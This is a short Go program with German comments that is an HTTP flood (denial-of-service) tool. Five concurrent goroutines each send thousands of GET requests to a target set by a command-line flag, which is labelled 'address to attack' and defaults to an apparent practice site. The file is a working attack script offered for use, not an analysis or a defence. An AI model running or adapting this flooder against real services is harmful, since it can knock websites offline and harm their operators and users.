package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
)

func main() {

	// 2 Flags IP und wie viele angriffe, vielleicht muss die adresse geändert werden
	address := flag.String("ip", "http://ddos.networkchuck.com/", "Enter address to attack")
	numOfAttacks := flag.Int("atk", 10000, "Enter how much requests you want to send")
	flag.Parse()
	// default 10000 http requests auf addr
	var wg sync.WaitGroup
	wg.Add(5)
	go func() {
		for i := 0; i < *numOfAttacks; i++ {
			resp, err := http.Get(*address)
			if err != nil {
				print(err)
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				print(err)
			}
			fmt.Print(string(body))
		}
		wg.Done()
	}()

	go func() {
		for i := 0; i < *numOfAttacks; i++ {
			resp, err := http.Get(*address)
			if err != nil {
				print(err)
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				print(err)
			}
			fmt.Print(string(body))
		}
		wg.Done()
	}()

	go func() {
		for i := 0; i < *numOfAttacks; i++ {
			resp, err := http.Get(*address)
			if err != nil {
				print(err)
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				print(err)
			}
			fmt.Print(string(body))
		}
		wg.Done()
	}()

	go func() {
		for i := 0; i < *numOfAttacks; i++ {
			resp, err := http.Get(*address)
			if err != nil {
				print(err)
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				print(err)
			}
			fmt.Print(string(body))
		}
		wg.Done()
	}()
	go func() {
		for i := 0; i < *numOfAttacks; i++ {
			resp, err := http.Get(*address)
			if err != nil {
				print(err)
			}

			defer resp.Body.Close()
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				print(err)
			}
			fmt.Print(string(body))
		}
		wg.Done()
	}()
	wg.Wait()
}
